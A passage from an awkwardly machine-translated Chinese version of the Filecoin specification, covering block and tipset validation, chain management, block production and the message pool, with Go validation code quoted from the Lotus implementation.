abi.TokenAmount\n \n\tMethod abi.MethodNum\n\tParams []byte\n}\n在将消息传递到链同步逻辑之前，还将对其进行验证 ：\n示例：ValidForBlockInclusion\nfunc (m *Message) ValidForBlockInclusion(minGas int64) error {\n\tif m.Version != 0 {\n\t\treturn xerrors.New(&quot;&#039;Version&#039; unsupported&quot;)\n\t}\n \n\tif m.To == address.Undef {\n\t\treturn xerrors.New(&quot;&#039;To&#039; address cannot be empty&quot;)\n\t}\n \n\tif m.From == address.Undef {\n\t\treturn xerrors.New(&quot;&#039;From&#039; address cannot be empty&quot;)\n\t}\n \n\tif m.Value.Int == nil {\n\t\treturn xerrors.New(&quot;&#039;Value&#039; cannot be nil&quot;)\n\t}\n \n\tif m.Value.LessThan(big.Zero()) {\n\t\treturn xerrors.New(&quot;&#039;Value&#039; field cannot be negative&quot;)\n\t}\n \n\tif m.Value.GreaterThan(TotalFilecoinInt) {\n\t\treturn xerrors.New(&quot;&#039;Value&#039; field cannot be greater than total filecoin supply&quot;)\n\t}\n \n\tif m.GasFeeCap.Int == nil {\n\t\treturn xerrors.New(&quot;&#039;GasFeeCap&#039; cannot be nil&quot;)\n\t}\n \n\tif m.GasFeeCap.LessThan(big.Zero()) {\n\t\treturn xerrors.New(&quot;&#039;GasFeeCap&#039; field cannot be negative&quot;)\n\t}\n \n\tif m.GasPremium.Int == nil {\n\t\treturn xerrors.New(&quot;&#039;GasPremium&#039; cannot be nil&quot;)\n\t}\n \n\tif m.GasPremium.LessThan(big.Zero()) {\n\t\treturn xerrors.New(&quot;&#039;GasPremium&#039; field cannot be negative&quot;)\n\t}\n \n\tif m.GasPremium.GreaterThan(m.GasFeeCap) {\n\t\treturn xerrors.New(&quot;&#039;GasFeeCap&#039; less than &#039;GasPremium&#039;&quot;)\n\t}\n \n\tif m.GasLimit &gt; build.BlockGasLimit {\n\t\treturn xerrors.New(&quot;&#039;GasLimit&#039; field cannot be greater than a block&#039;s gas limit&quot;)\n\t}\n \n\t// since prices might vary with time, this is technically semantic validation\n\tif m.GasLimit &lt; minGas {\n\t\treturn xerrors.Errorf(&quot;&#039;GasLimit&#039; field cannot be less than the cost of storing a message on chain %d &lt; %d&quot;, m.GasLimit, minGas)\n\t}\n \n\treturn nil\n}\n2.4.1.1.1块语法验证\n语法验证是指应在不参考外部信息（例如父状态树）的情况下对块及其消息执行的验证。这种验证类型有时称为静态验证。\n无效的块不得作为父对象传输或引用。\n语法上有效的块头必须解码为与以下定义匹配的字段，必须是有效的CBOR PubSubBlockMsg消息，并且必须具有：\n\n\n在1和5*ec.ExpectedLeaders ParentsCID之间，如果Epoch大于零（否则为空Parents），\n\n\n一个非负ParentWeight，\n\n\n少于或等于BlockMessageLimit消息数，\n\n\n封装在MsgMeta结构中的聚合消息CID，序列化为Messages块头中的CID，\n\n\n一个Miner是ID地址的地址。Address块头中的Miner应该存在，并与当前链状态下的公共密钥地址相对应。\n\n\nBlockSig属于矿工检索到的公钥地址的块签名（）\n\n\n一个非负Epoch，\n\n\n一个积极的Timestamp，\n\n\n一个Ticket非空VRFResult，\n\n\nElectionPoStOutput\n\n包含：\n\n一个Candidates介于1和EC.ExpectedLeaders值之间（含）的数组，\n一个非空PoStRandomness字段，\n一个非空Proof字段，\n\n\n\n一个非空ForkSignal字段。\n\n\n句法有效的完整块必须具有：\n\n所有引用的消息在语法上均有效，\n所有引用的父母收据在语法上均有效，\n块头和包含的消息的序列化大小之和不大于block.BlockMaxSize，\n所有显式消息的气体限制总和不大于block.BlockGasLimit。\n\n请注意，块签名的验证需要从父提示集状态访问矿工的地址和公钥，因此签名验证是语义验证的一部分。同样，消息签名验证要求查找与From处于块的父状态的每个消息的帐户执行者相关联的公钥。\n2.4.1.1.2阻止语义验证\n语义验证是指需要引用块头和消息本身之外的信息的验证。语义验证与构建块的父提示集和状态有关。\n为了进行语义验证，FullBlock必须从接收到的块头中提取其Filecoin消息进行组装。可以从网络中检索阻止消息CID，并将其解码为有效的CBOR Message/ SignedMessage。\n在Lotus实现中，模块的语义验证由Syncer模块执行：\n示例：ValidateBlock\nValidateBlock应该与spec.validation.md中的“语义验证”匹配\nfunc (syncer *Syncer) ValidateBlock(ctx context.Context, b *types.FullBlock, useCache bool) (err error) {\n\tdefer func() {\n\t\t// b.Cid() could panic for empty blocks that are used in tests.\n\t\tif rerr := recover(); rerr != nil {\n\t\t\terr = xerrors.Errorf(&quot;validate block panic: %w&quot;, rerr)\n\t\t\treturn\n\t\t}\n\t}()\n \n\tif useCache {\n\t\tisValidated, err := syncer.store.IsBlockValidated(ctx, b.Cid())\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;check block validation cache %s: %w&quot;, b.Cid(), err)\n\t\t}\n \n\t\tif isValidated {\n\t\t\treturn nil\n\t\t}\n\t}\n \n\tvalidationStart := build.Clock.Now()\n\tdefer func() {\n\t\tstats.Record(ctx, metrics.BlockValidationDurationMilliseconds.M(metrics.SinceInMilliseconds(validationStart)))\n\t\tlog.Infow(&quot;block validation&quot;, &quot;took&quot;, time.Since(validationStart), &quot;height&quot;, b.Header.Height, &quot;age&quot;, time.Since(time.Unix(int64(b.Header.Timestamp), 0)))\n\t}()\n \n\tctx, span := trace.StartSpan(ctx, &quot;validateBlock&quot;)\n\tdefer span.End()\n \n\tif err := blockSanityChecks(b.Header); err != nil {\n\t\treturn xerrors.Errorf(&quot;incoming header failed basic sanity checks: %w&quot;, err)\n\t}\n \n\th := b.Header\n \n\tbaseTs, err := syncer.store.LoadTipSet(types.NewTipSetKey(h.Parents...))\n\tif err != nil {\n\t\treturn xerrors.Errorf(&quot;load parent tipset failed (%s): %w&quot;, h.Parents, err)\n\t}\n \n\tlbts, lbst, err := stmgr.GetLookbackTipSetForRound(ctx, syncer.sm, baseTs, h.Height)\n\tif err != nil {\n\t\treturn xerrors.Errorf(&quot;failed to get lookback tipset for block: %w&quot;, err)\n\t}\n \n\tprevBeacon, err := syncer.store.GetLatestBeaconEntry(baseTs)\n\tif err != nil {\n\t\treturn xerrors.Errorf(&quot;failed to get latest beacon entry: %w&quot;, err)\n\t}\n \n\t// fast checks first\n\tnulls := h.Height - (baseTs.Height() + 1)\n\tif tgtTs := baseTs.MinTimestamp() + build.BlockDelaySecs*uint64(nulls+1); h.Timestamp != tgtTs {\n\t\treturn xerrors.Errorf(&quot;block has wrong timestamp: %d != %d&quot;, h.Timestamp, tgtTs)\n\t}\n \n\tnow := uint64(build.Clock.Now().Unix())\n\tif h.Timestamp &gt; now+build.AllowableClockDriftSecs {\n\t\treturn xerrors.Errorf(&quot;block was from the future (now=%d, blk=%d): %w&quot;, now, h.Timestamp, ErrTemporal)\n\t}\n\tif h.Timestamp &gt; now {\n\t\tlog.Warn(&quot;Got block from the future, but within threshold&quot;, h.Timestamp, build.Clock.Now().Unix())\n\t}\n \n\tmsgsCheck := async.Err(func() error {\n\t\tif err := syncer.checkBlockMessages(ctx, b, baseTs); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;block had invalid messages: %w&quot;, err)\n\t\t}\n\t\treturn nil\n\t})\n \n\tminerCheck := async.Err(func() error {\n\t\tif err := syncer.minerIsValid(ctx, h.Miner, baseTs); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;minerIsValid failed: %w&quot;, err)\n\t\t}\n\t\treturn nil\n\t})\n \n\tbaseFeeCheck := async.Err(func() error {\n\t\tbaseFee, err := syncer.store.ComputeBaseFee(ctx, baseTs)\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;computing base fee: %w&quot;, err)\n\t\t}\n\t\tif types.BigCmp(baseFee, b.Header.ParentBaseFee) != 0 {\n\t\t\treturn xerrors.Errorf(&quot;base fee doesn&#039;t match: %s (header) != %s (computed)&quot;,\n\t\t\t\tb.Header.ParentBaseFee, baseFee)\n\t\t}\n\t\treturn nil\n\t})\n\tpweight, err := syncer.store.Weight(ctx, baseTs)\n\tif err != nil {\n\t\treturn xerrors.Errorf(&quot;getting parent weight: %w&quot;, err)\n\t}\n \n\tif types.BigCmp(pweight, b.Header.ParentWeight) != 0 {\n\t\treturn xerrors.Errorf(&quot;parrent weight different: %s (header) != %s (computed)&quot;,\n\t\t\tb.Header.ParentWeight, pweight)\n\t}\n \n\tstateRootCheck := async.Err(func() error {\n\t\tstateroot, precp, err := syncer.sm.TipSetState(ctx, baseTs)\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;get tipsetstate(%d, %s) failed: %w&quot;, h.Height, h.Parents, err)\n\t\t}\n \n\t\tif stateroot != h.ParentStateRoot {\n\t\t\tmsgs, err := syncer.store.MessagesForTipset(baseTs)\n\t\t\tif err != nil {\n\t\t\t\tlog.Error(&quot;failed to load messages for tipset during tipset state mismatch error: &quot;, err)\n\t\t\t} else {\n\t\t\t\tlog.Warn(&quot;Messages for tipset with mismatching state:&quot;)\n\t\t\t\tfor i, m := range msgs {\n\t\t\t\t\tmm := m.VMMessage()\n\t\t\t\t\tlog.Warnf(&quot;Message[%d]: from=%s to=%s method=%d params=%x&quot;, i, mm.From, mm.To, mm.Method, mm.Params)\n\t\t\t\t}\n\t\t\t}\n \n\t\t\treturn xerrors.Errorf(&quot;parent state root did not match computed state (%s != %s)&quot;, stateroot, h.ParentStateRoot)\n\t\t}\n \n\t\tif precp != h.ParentMessageReceipts {\n\t\t\treturn xerrors.Errorf(&quot;parent receipts root did not match computed value (%s != %s)&quot;, precp, h.ParentMessageReceipts)\n\t\t}\n \n\t\treturn nil\n\t})\n \n\t// Stuff that needs worker address\n\twaddr, err := stmgr.GetMinerWorkerRaw(ctx, syncer.sm, lbst, h.Miner)\n\tif err != nil {\n\t\treturn xerrors.Errorf(&quot;GetMinerWorkerRaw failed: %w&quot;, err)\n\t}\n \n\twinnerCheck := async.Err(func() error {\n\t\tif h.ElectionProof.WinCount &lt; 1 {\n\t\t\treturn xerrors.Errorf(&quot;block is not claiming to be a winner&quot;)\n\t\t}\n \n\t\teligible, err := stmgr.MinerEligibleToMine(ctx, syncer.sm, h.Miner, baseTs, lbts)\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;determining if miner has min power failed: %w&quot;, err)\n\t\t}\n \n\t\tif !eligible {\n\t\t\treturn xerrors.New(&quot;block&#039;s miner is ineligible to mine&quot;)\n\t\t}\n \n\t\trBeacon := *prevBeacon\n\t\tif len(h.BeaconEntries) != 0 {\n\t\t\trBeacon = h.BeaconEntries[len(h.BeaconEntries)-1]\n\t\t}\n\t\tbuf := new(bytes.Buffer)\n\t\tif err := h.Miner.MarshalCBOR(buf); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;failed to marshal miner address to cbor: %w&quot;, err)\n\t\t}\n \n\t\tvrfBase, err := store.DrawRandomness(rBeacon.Data, crypto.DomainSeparationTag_ElectionProofProduction, h.Height, buf.Bytes())\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;could not draw randomness: %w&quot;, err)\n\t\t}\n \n\t\tif err := VerifyElectionPoStVRF(ctx, waddr, vrfBase, h.ElectionProof.VRFProof); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;validating block election proof failed: %w&quot;, err)\n\t\t}\n \n\t\tslashed, err := stmgr.GetMinerSlashed(ctx, syncer.sm, baseTs, h.Miner)\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;failed to check if block miner was slashed: %w&quot;, err)\n\t\t}\n \n\t\tif slashed {\n\t\t\treturn xerrors.Errorf(&quot;received block was from slashed or invalid miner&quot;)\n\t\t}\n \n\t\tmpow, tpow, _, err := stmgr.GetPowerRaw(ctx, syncer.sm, lbst, h.Miner)\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;failed getting power: %w&quot;, err)\n\t\t}\n \n\t\tj := h.ElectionProof.ComputeWinCount(mpow.QualityAdjPower, tpow.QualityAdjPower)\n\t\tif h.ElectionProof.WinCount != j {\n\t\t\treturn xerrors.Errorf(&quot;miner claims wrong number of wins: miner: %d, computed: %d&quot;, h.ElectionProof.WinCount, j)\n\t\t}\n \n\t\treturn nil\n\t})\n \n\tblockSigCheck := async.Err(func() error {\n\t\tif err := sigs.CheckBlockSignature(ctx, h, waddr); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;check block signature failed: %w&quot;, err)\n\t\t}\n\t\treturn nil\n\t})\n \n\tbeaconValuesCheck := async.Err(func() error {\n\t\tif os.Getenv(&quot;LOTUS_IGNORE_DRAND&quot;) == &quot;_yes_&quot; {\n\t\t\treturn nil\n\t\t}\n \n\t\tif err := beacon.ValidateBlockValues(syncer.beacon, h, baseTs.Height(), *prevBeacon); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;failed to validate blocks random beacon values: %w&quot;, err)\n\t\t}\n\t\treturn nil\n\t})\n \n\ttktsCheck := async.Err(func() error {\n\t\tbuf := new(bytes.Buffer)\n\t\tif err := h.Miner.MarshalCBOR(buf); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;failed to marshal miner address to cbor: %w&quot;, err)\n\t\t}\n \n\t\tif h.Height &gt; build.UpgradeSmokeHeight {\n\t\t\tbuf.Write(baseTs.MinTicket().VRFProof)\n\t\t}\n \n\t\tbeaconBase := *prevBeacon\n\t\tif len(h.BeaconEntries) != 0 {\n\t\t\tbeaconBase = h.BeaconEntries[len(h.BeaconEntries)-1]\n\t\t}\n \n\t\tvrfBase, err := store.DrawRandomness(beaconBase.Data, crypto.DomainSeparationTag_TicketProduction, h.Height-build.TicketRandomnessLookback, buf.Bytes())\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;failed to compute vrf base for ticket: %w&quot;, err)\n\t\t}\n \n\t\terr = VerifyElectionPoStVRF(ctx, waddr, vrfBase, h.Ticket.VRFProof)\n\t\tif err != nil {\n\t\t\treturn xerrors.Errorf(&quot;validating block tickets failed: %w&quot;, err)\n\t\t}\n\t\treturn nil\n\t})\n \n\twproofCheck := async.Err(func() error {\n\t\tif err := syncer.VerifyWinningPoStProof(ctx, h, *prevBeacon, lbst, waddr); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;invalid election post: %w&quot;, err)\n\t\t}\n\t\treturn nil\n\t})\n \n\tawait := []async.ErrorFuture{\n\t\tminerCheck,\n\t\ttktsCheck,\n\t\tblockSigCheck,\n\t\tbeaconValuesCheck,\n\t\twproofCheck,\n\t\twinnerCheck,\n\t\tmsgsCheck,\n\t\tbaseFeeCheck,\n\t\tstateRootCheck,\n\t}\n \n\tvar merr error\n\tfor _, fut := range await {\n\t\tif err := fut.AwaitContext(ctx); err != nil {\n\t\t\tmerr = multierror.Append(merr, err)\n\t\t}\n\t}\n\tif merr != nil {\n\t\tmulErr := merr.(*multierror.Error)\n\t\tmulErr.ErrorFormat = func(es []error) string {\n\t\t\tif len(es) == 1 {\n\t\t\t\treturn fmt.Sprintf(&quot;1 error occurred:\\n\\t* %+v\\n\\n&quot;, es[0])\n\t\t\t}\n \n\t\t\tpoints := make([]string, len(es))\n\t\t\tfor i, err := range es {\n\t\t\t\tpoints[i] = fmt.Sprintf(&quot;* %+v&quot;, err)\n\t\t\t}\n \n\t\t\treturn fmt.Sprintf(\n\t\t\t\t&quot;%d errors occurred:\\n\\t%s\\n\\n&quot;,\n\t\t\t\tlen(es), strings.Join(points, &quot;\\n\\t&quot;))\n\t\t}\n\t\treturn mulErr\n\t}\n \n\tif useCache {\n\t\tif err := syncer.store.MarkBlockAsValidated(ctx, b.Cid()); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;caching block validation %s: %w&quot;, b.Cid(), err)\n\t\t}\n\t}\n \n\treturn nil\n}\n邮件是通过检索的Syncer。遵循以下两个步骤Syncer：1-FullTipSet用先前收到的单个块组装一个填充块。该数据块ParentWeight大于最重的提示集（第一个数据块）中的数据块。2-从收到的块中检索所有提示集，直到我们的链。验证扩展到这些提示集中的每个块。验证应确保：-信标整体按其轮次排序。-提示集ParentsCID与通过BlockSync获取的父提示集匹配。\n语义上有效的块必须满足以下所有要求。\nParents-有关\n\nParents按其标题的字典顺序列出Ticket。\nParentStateRoot块的CID与从父Tipset计算的状态CID匹配 。\nParentState 将通过执行父提示集的消息（由VM解释器定义）产生的状态树与该提示集的父状态相匹配。\nParentMessageReceipts标识父提示集执行产生的收据列表，并为父提示集的每条唯一消息提供一张收据。换句话说，块的ParentMessageReceiptsCID与从父提示集计算的收据CID匹配。\nParentWeight 匹配链的权重，直到并包括父提示集。\n\n与时间有关\n\n\nEpoch\n\n大于其\nParents\n\n，并且\n\n\n将来不会根据节点当前时间的本地时钟读数，\n\n在适当的时期之前，不应拒绝具有未来时期的模块，但不应对其进行评估（验证或包含在提示集中）\n\n\n\n不过去比软终结更远通过SPC定义的\n终局性\n，\n\n该规则仅在接收到新的八卦块（即从当前链头）接收时才适用，而不是在首次同步到链时。\n\n\n\n\n\n在\nTimestamp\n\n包括以秒为单位的是：\n\n不得大于当前时间加上 ΑllowableClockDriftSecs\n不得小于前一个块的Timestamp加号BlockDelay（包括空块）\n具有创世块的时间戳，网络的锁定时间和锁定的所隐含的精确值Epoch。\n\n\n\nMiner-有关\n\n\n的Miner是在父tipset状态存储功率表活性。矿工的地址已注册在ClaimsPower Actor的HAMT中\n\n\n对于\nTipSetState\n\n要验证的每个提示集，都应包含。\n\n提示集中的每个区块都应属于不同的矿工。\n\n\n\n与消息的From地址关联的Actor存在，是帐户actor，其Nonce与消息Nonce匹配。\n\n\n包括有效的证据，证明该矿工证明可以访问其面临挑战的部门的密封版本。为了实现这一目标：\n\n使用WinningPoSt域分隔标签为当前时期绘制随机性。\n根据绘制的随机性，获取此矿工在此时期面临挑战的扇区列表。\n\n\n\n矿工不被削减StoragePowerActor。\n\n\nBeacon- ＆Ticket-相关\n\n\n有效期\nBeaconEntries\n\n应包括：\n\n检查中的每一个BeaconEntries都是消息的签名：previousSignature || round使用DRAND的公钥签名。\n包括从MaxBeaconRoundForEpoch低到高prevEntry（从上一个技巧集开始）之间的所有条目。\n\n\n\n一个\nTicket\n\n来自父tipset的块头最小票获得，\n\nTicket.VRFResult由Miner演员的工人帐户公钥有效签署，\n\n\n\nElectionProof Ticket通过使用矿工的密钥检查BLS签名来正确计算得出。该ElectionProof票应该是中奖票。\n\n\n消息和签名相关\n\n\nsecp256k1邮件已通过其发送方（From）工作者帐户密钥正确签名，\n\n\nBLSAggregate包括一个签名，该签名使用该块的发送参与者的密钥来签名该块引用的所有BLS消息的CID数组。\n\n\nSignature包含来自块的Miner参与者的工作人员帐户公共密钥的块头的有效字段。\n\n\n对于\nValidForBlockInclusion()\n\n以下保持的每条消息：\n\n消息字段Version，To，From，Value，GasPrice，和GasLimit正确定义。\n消息GasLimit低于消息的最低气体成本（来自链高度和消息长度）。\n\n\n\n对于其中的每个消息\nApplyMessage\n\n（即在执行消息之前），以下保持：\n\n\n基本气体和价值检查在\ncheckMessage()\n\n：\n\n消息GasLimit大于零。\n消息GasPrice和Value已设置。\n\n\n\n消息的存储气体成本低于消息的GasLimit。\n\n\n消息Nonce与从消息From地址中检索到的Actor中的随机数匹配。\n\n\n消息的最大用气成本（从其GasLimit，GasPrice和派生Value）低于从消息From地址检索的Actor的余额。\n\n\n消息的传输Value处于从消息From地址中检索到的Actor的余额之下。\n\n\n\n\n除了验证签名之外，没有对块中包含的消息进行语义验证的方法。如果块中包含的所有消息在语法上均有效，则可以执行它们并产生收据。\n链同步系统可以分阶段执行语法和语义验证，以最大程度地减少不必要的资源消耗。\n如果以上所有测试均成功，则将该块标记为已验证。最终，无效块不得进一步传播或验证为父节点。\n2.4.1.2小费\n预期共识在每个时期概率选举出多个领导者，这意味着Filecoin链在每个时期可能包含零个或多个区块（每个选举的矿工一个）。来自同一时期的块被组装到提示集中。所述 VM解释器通过在tipset执行的所有消息（包括在多于一个的块相同消息的重复数据删除之后）修改Filecoin状态树。\n每个块都引用一个父提示集，并验证该提示集的state，同时提出要包含在当前时代的消息。除非将该块合并到提示集中，否则无法知道新块的消息所应用的状态。因此，孤立地从单个块中执行消息是没有意义的：只有执行了该块的技巧集中的所有消息后，才知道新的状态树。\n一个有效的提示集包含一个非空的块集合，这些块具有不同的矿工，并且全部指定相同：\n\nEpoch\nParents\nParentWeight\nStateRoot\nReceiptsRoot\n\n提示集中的各个块按每个块票证中字节的字典顺序进行规范排序，从而与该块本身的CID字节断开联系。\n由于网络传播延迟，在时间段N + 1中的矿工可能会从其父提示集中忽略在时间段N处挖掘的有效块。这不会使新生成的块无效，但是会降低其权重和成为EC链选择功能定义的协议中规范链一部分的机会 。\n块生产者应该协调他们如何选择要包含在块中的消息，以避免重复，从而从消息费用中最大化他们的预期收益（请参阅 消息池）。\nLotus实现中的主要Tipset结构包括以下内容：\n示例：TipSet\ntype TipSet struct {\n\tcids   []cid.Cid\n\tblks   []*BlockHeader\n\theight abi.ChainEpoch\n}\nTipset的语义验证包括以下检查。\n示例：NewTipSet\n检查：\n\n提示集由至少一个块组成。（由于每个提示集的可变块数由随机性决定，因此我们不施加上限。）\n所有块都具有相同的高度。\n所有块都具有相同的父代（它们具有相同的数量和匹配的CID）。\n\nfunc NewTipSet(blks []*BlockHeader) (*TipSet, error) {\n\tif len(blks) == 0 {\n\t\treturn nil, xerrors.Errorf(&quot;NewTipSet called with zero length array of blocks&quot;)\n\t}\n \n\tsort.Slice(blks, tipsetSortFunc(blks))\n \n\tvar ts TipSet\n\tts.cids = []cid.Cid{blks[0].Cid()}\n\tts.blks = blks\n\tfor _, b := range blks[1:] {\n\t\tif b.Height != blks[0].Height {\n\t\t\treturn nil, fmt.Errorf(&quot;cannot create tipset with mismatching heights&quot;)\n\t\t}\n \n\t\tif len(blks[0].Parents) != len(b.Parents) {\n\t\t\treturn nil, fmt.Errorf(&quot;cannot create tipset with mismatching number of parents&quot;)\n\t\t}\n \n\t\tfor i, cid := range b.Parents {\n\t\t\tif cid != blks[0].Parents[i] {\n\t\t\t\treturn nil, fmt.Errorf(&quot;cannot create tipset with mismatching parents&quot;)\n\t\t\t}\n\t\t}\n \n\t\tts.cids = append(ts.cids, b.Cid())\n \n\t}\n\tts.height = blks[0].Height\n \n\treturn &amp;ts, nil\n}\n2.4.1.3连锁店经理\n所述链经理是在blockchain系统中的中心组件。它跟踪并更新给定节点接收到的竞争子链，以选择适当的区块链头：它在系统中知道的最重子链的最新块。\n这样做，链管理器是中央子系统，它处理Filecoin节点中许多其他系统的簿记工作，并公开了供那些系统使用的便捷方法，从而使系统能够从链中抽样随机性，或查看哪个块已被占用。最近完成。\n2.4.1.3.1延伸链\n2.4.1.3.1.1接收块接收\n对于每个传入的块，即使未将传入的块添加到当前最重的提示集中，链管理器也应将其添加到它正在跟踪的适当子链中，或独立地对其进行跟踪，直到：\n\n它能够通过接收该子链中的另一个块来添加到当前最重的子链中，或者\n它可以丢弃它，因为该块是在最终确定之前开采的。\n\n重要的是要注意，在最终确定之前，给定的子链可能会被替换为在给定回合中开采的另一个较重的子链。为了快速适应这种情况，链管理者必须维护和更新所有考虑到最终的子链。\n链选择是Filecoin区块链工作方式的关键组成部分。简而言之，每个链都有相关的权重，这些权重说明了在其上开采的块数以及它们跟踪的功率（存储）。“选择链”部分提供了有关选择工作原理的全部详细信息 。\n注释/建议：\n\n为了简化某些验证检查，应该按高度和父集对块进行索引。这样，可以快速查询具有给定高度和普通父母的几组积木。\n在这些集中计算和缓存块的结果聚合状态可能也很有用，当检查有多个父级的块从哪个状态根开始时，这样可以节省额外的状态计算。\n建议将块保留在本地数据存储中，无论此时是否将其理解为最佳技巧-这是为了避免将来不得不重新提取相同的块。\n\n2.4.1.3.1.2ChainTipsManager\n链技巧管理器是Filecoin共识的子组件，负责跟踪Filecoin区块链的所有实时技巧，并跟踪当前的“最佳”技巧集。\n// Returns the ticket that is at round &#039;r&#039; in the chain behind &#039;head&#039;\nfunc TicketFromRound(head Tipset, r Round) {}\n \n// Returns the tipset that contains round r (Note: multiple rounds&#039; worth of tickets may exist within a single block due to losing tickets being added to the eventually successfully generated block)\nfunc TipsetFromRound(head Tipset, r Round) {}\n \n// GetBestTipset returns the best known tipset. If the &#039;best&#039; tipset hasn&#039;t changed, then this\n// will return the previous best tipset.\nfunc GetBestTipset()\n \n// Adds the losing ticket to the chaintips manager so that blocks can be mined on top of it\nfunc AddLosingTicket(parent Tipset, t Ticket)\n2.4.1.4制片人\n2.4.1.4.1采矿块\n如果已证明拥有满足最小矿工规模阈值要求的储量，则向储能演员注册的矿工可以开始生成和检查选举票 。\n为了做到这一点，矿工必须进行连锁验证，并跟踪收到的最新区块。矿工的新区块将基于前一个时期的父母。\n2.4.1.4.1.1块创建\n为一个时期生成一个块H需要等待该时期的信标输入并使用它来运行GenerateElectionProof。如果WinCount≥1（即，当矿工当选），相同的信标条目用于运行WinningPoSt。有了ElectionProof票证（的输出GenerateElectionProof）和WinningPoSt证明，矿工可以生产一个新的区块。\n见 VM解释为母体tipset评价的细节，并 阻止对有效块标头值的约束。\n要创建一个区块，合格的矿工必须计算一些字段：\n\n\nParents -父提示集块的CID。\n\n\nParentWeight-父链的权重（请参阅“ 链选择”）。\n\n\nParentState-来自父提示集状态评估的状态根的CID（请参阅 VM Interpreter）。\n\n\nParentMessageReceipts-AMT根目录的CID，其中包含计算时产生的收据ParentState。\n\n\nEpoch-块的纪元，从该Parents纪元和生成该块所花费的纪元数得出。\n\n\nTimestamp -创建块时生成的Unix时间戳（以秒为单位）。\n\n\nBeaconEntries-从最后一个块开始生成的一组drand条目（请参阅 Beacon Entries）。\n\n\nTicket-从上一个纪元生成的新票证（请参见 票证生成）。\n\n\nMiner -区块生产者的矿工演员地址。\n\n\nMessages\n\n-\nTxMeta\n\n包含建议包含在新块中的消息的对象的CID ：\n\n从内存池中选择一组消息以包括在块中，以满足块大小和气体限制\n将邮件分为BLS签名邮件和secpk签名邮件\nTxMeta.BLSMessages：包含裸笔UnsignedMessage的AMT根目录的CID\nTxMeta.SECPMessages：一个AMT的根的CID包括SignedMessage小号\n\n\n\nBeaconEntries：从中导出随机性的信标条目列表\n\n\nBLSAggregate -使用BLS签名的块中所有消息的聚集签名。\n\n\nSignature -在区块标题的序列化表示形式（带有空签名）上具有矿工的工人帐户私钥的签名（还必须与票证签名匹配）。\n\n\nForkSignaling-uint64标志用作信令分叉的一部分。默认情况下应设置为0。\n\n\n注意，要生成有效块，无需评估要包含在块中的消息。矿工可能仍希望通过投机方式评估消息，以便进行优化，以包括将成功执行并支付最多汽油的消息。\n产生积木时不评估积木奖励。在以下纪元的提示集中包含该区块时，将对其进行支付。\n区块的签名确保了区块在传播后的完整性，因为与许多PoW区块链不同，发现中奖票证与区块生成无关。\n2.4.1.4.1.2块广播\n合格的矿工使用GossipSub /fil/blocks主题将完成的区块传播到网络 ，并且假设一切都正确完成，则网络将接受它，其他矿工将在其之上进行挖掘，从而获得矿工的奖励。\n矿工应在产生有效块后立即输出其有效块，否则冒着其他矿工冒着在EPOCH_CUTOFF之后接收该块且不将其包括在当前时期中的风险。\n2.4.1.4.2块奖励\n集体奖励由奖励演员处理 。在Filecoin令牌部分讨论了 有关区块奖励的更多详细信息，在矿工抵押品部分讨论了有关区块奖励抵押的详细信息 。\n2.4.信息池\n消息池，或者mpool或者mempool是Filecoin协议中的消息池。它充当Filecoin节点与用于链下消息传播的其他节点的对等网络之间的接口。节点使用消息池来维护它们要传输到Filecoin VM并添加到链中的一组消息（即，添加用于“链上”执行）。\n为了使消息最终出现在区块链中，它首先必须位于消息池中。实际上，至少在Filecoin的Lotus实现中，没有中央消息池存储在某处。而是，消息池是一种抽象，并实现为网络中每个节点保留的消息列表。因此，当节点将新消息放入消息池时，该消息将使用libp2p的pubsub协议GossipSub传播到网络的其余部分。节点需要订阅相应的pubsub主题才能接收消息。\n使用GossipSub进行消息传播不会立即发生，因此，在不同节点上的消息池可以同步之前存在一些滞后。实际上，在给消息池添加连续的消息流以及传播消息的延迟的情况下，消息池永远不会在网络中的所有节点之间同步。这不是系统的缺点，如不是短信池也需要通过网络进行同步。\n消息池应具有定义的最大大小，以避免DoS攻击，在DoS攻击中，节点被垃圾邮件吞噬并耗尽内存。消息池的建议大小为5000条消息。\n2.4.2.1讯息传播\n消息池必须与libp2p pubsub GossipSub协议接口 。这是因为消息通过GossipSub传播了 相应的/fil/msgs/ 主题。参与网络的任何节点都会在相应的主题中宣布每个 消息/fil/msgs/。\n有两个与消息和块相关的主要pubsub主题：i）/fil/msgs/携带消息的主题，以及ii）/fil/blocks/携带块的主题。该/fil/msgs/主题链接到mpool。流程如下：\n\n当客户想要在Filecoin网络中发送消息时，他们会将消息发布到/fil/msgs/主题。\n该消息使用GossipSub传播到网络中的所有其他节点，并最终出现在mpool所有矿工中。\n根据加密货币经济规则，某些矿工最终会从中mpool（与其他消息一起）挑选消息并将其包含在一个块中。\n矿工在/fil/blocks/pubsub主题中发布新挖掘的块，并且该块传播到网络中的所有节点（包括发布此块中包含的消息的节点）。\n\n节点必须检查传入消息是否有效，即它们是否具有有效签名。如果该消息无效，则应将其丢弃并且不得转发。\nGossipSub协议的更新的强化版本包括多种缓解攻击的策略。例如，当节点收到无效消息时，它将负分数分配给发送方对等方。对等分数不与其他节点共享，而是由其与之交互的所有其他对等点在每个对等点本地保存。如果对等方的得分下降到阈值以下，则将其从评分对等方的网格中排除。我们将在GossipSub部分中讨论有关这些设置的更多详细信息。完整的细节可以在GossipSub规范中找到 